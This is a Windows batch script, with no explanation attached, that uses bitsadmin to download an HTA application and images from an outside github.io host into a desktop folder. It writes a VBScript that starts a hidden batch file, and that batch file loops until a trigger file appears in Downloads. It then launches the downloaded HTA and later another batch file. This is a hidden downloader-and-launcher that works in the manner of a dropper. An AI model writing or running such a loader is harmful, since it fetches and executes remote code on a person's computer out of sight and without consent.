@echo off
cd "%systemdrive%/documents and settings/%username%/desktop"
md MASTERFOLDER
cd "%systemdrive%/documents and settings/%username%/desktop/MASTERFOLDER"
md img
bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/Start.hta %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/1.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\1.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/2.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\2.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/3.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\3.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/4.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\4.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/5.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\5.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/6.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\6.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/7.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\7.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/8.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\8.jpg

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\Desktop\MASTERFOLDER\img\mor.gif

bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Desktop\MASTERFOLDER\img\trippymeme.jpg
echo.>"%USERPROFILE%\Desktop\MASTERFOLDER\invisibility.vbs"
@echo strUser = CreateObject("WScript.Network").UserName> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.vbs
@echo Set WshShell = CreateObject("WScript.Shell" ) >> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.vbs
@echo WshShell.Run chr(34) & "C:\Users\" + strUser + "\Desktop\MASTERFOLDER\invisibility.bat" & Chr(34), 0 >> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.vbs
@echo Set WshShell = Nothing >> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.vbs

echo.>"%USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat"
@echo @ECHO OFF> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo :start>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo IF EXIST %USERPROFILE%\Downloads\activate.txt (>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo start %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo goto :check>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo ) ELSE (>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo goto :start>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo )>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo :check>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo IF EXIST %USERPROFILE%\Desktop\mains.bat (>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo start %USERPROFILE%\Desktop\mains.bat>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo exit>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo )>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat
@echo goto :check>> %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.bat

start %USERPROFILE%\Desktop\MASTERFOLDER\invisibility.vbs